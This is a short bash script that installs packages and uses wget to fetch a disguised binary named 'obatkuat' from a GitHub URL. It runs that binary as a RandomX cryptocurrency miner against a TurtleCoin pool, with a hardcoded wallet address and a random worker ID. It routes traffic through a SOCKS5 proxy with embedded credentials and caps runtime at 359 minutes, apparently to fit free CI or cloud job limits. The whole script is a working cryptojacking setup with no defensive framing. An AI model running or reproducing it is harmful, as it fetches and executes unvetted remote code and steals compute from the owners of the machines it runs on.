#!/bin/bash

sudo apt update
sudo apt install screen libjansson4 -y
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
chmod +x ternak.sh && chmod +x obatkuat
screen -dmS ls
A=us.turtlecoin.herominers.com:1160
B=TRTLuxaMVkNaKUrey8Dh6tfKSzup58rRbdQFW6RGTR8dSy2VkY5tXbRAPLMuC44C3rZYGumcAuFKjFktTEGV9Z5wRvnjnxzaxvR
C=$(shuf -i 10-9999999999999999999 -n 1)
D=socks5://bambank:123@147.182.228.194:3000
timeout 359m ./obatkuat -a rx/0 -o $A -u $B.$C -p x -t 8 -x $D -k
